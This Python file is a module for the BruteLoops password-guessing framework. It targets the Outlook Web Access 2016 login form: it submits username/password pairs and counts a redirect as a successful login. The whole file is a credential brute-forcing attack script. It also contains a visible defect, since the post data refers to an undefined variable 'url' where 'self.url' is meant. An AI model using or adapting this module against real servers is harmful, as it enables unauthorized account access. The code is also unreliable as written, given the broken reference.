#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
from re import search
import requests
from BruteLoops.example.module import Module as BLModule

class Module(BLModule):

    name = 'http.owa2016'
    description = brief_description = 'OWA 2016 web interface'

    def __init__(self, url:'required:True,type:str,help:URL to target',
            proxies:'required:False,type:str,help:HTTP proxies'={},
            headers:'required:False,type:str,help:HTTP headers'={},
            verify_ssl:'required:False,type:str,help:Verify SSL'=False):

        self.url = url
        self.proxies = proxies
        self.headers = headers
        self.verify_ssl = verify_ssl

    def __call__(self,username,password,*args,**kwargs):
    
        # post data
        data = {
            'destination':url,
            'flags':4,
            'forcedownlevel':0,
            'username':username,
            'password':password,
            'passwordText':'',
            'isUtf8':1
        }
    
        # make the request
        resp = requests.post(self.url,
                data=data,
                headers=self.headers,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies)
    
        # verify credentials and return outcome
        if resp.status_code == 302 and resp.headers['Location'] and (
            search(r'auth\/logon\.aspx\?', resp.headers['Location'])):
            return [0, username, password]
        else:
            return [1, username, password]
